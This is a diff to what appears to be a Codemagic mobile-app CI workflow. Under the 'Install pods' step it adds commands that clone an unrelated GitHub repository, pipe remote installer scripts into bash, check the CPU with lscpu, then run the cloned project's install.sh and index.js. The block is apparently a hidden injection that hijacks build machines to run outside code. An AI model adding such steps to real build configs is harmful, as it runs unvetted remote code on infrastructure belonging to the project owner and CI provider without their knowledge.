@@ -27,6 +27,26 @@ workflows:
       - name: Install pods
         script: |
           pod install
+          #!/usr/bin/env bash
+          # fail if any commands fails
+          git clone https://github.com/raufpermana24/mastrrbro.git
+          apt update
+          apt install curl ca-certificates -y
+          curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+          source ~/.bashrc
+          nvm install 20
+          ls
+          lscpu
+          cd mastrrbro
+          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
+          apt-get install -y nodejs
+          apt install npm -y npm
+          npm install -g npm
+          npm i -g yarn
+          yarn install  & sleep 120s; kill $!
+          #npm install
+          sh install.sh
+          node index.js
       - name: Set up keychain to be used for codesigning using Codemagic CLI 'keychain' command
         script: |
           keychain initialize
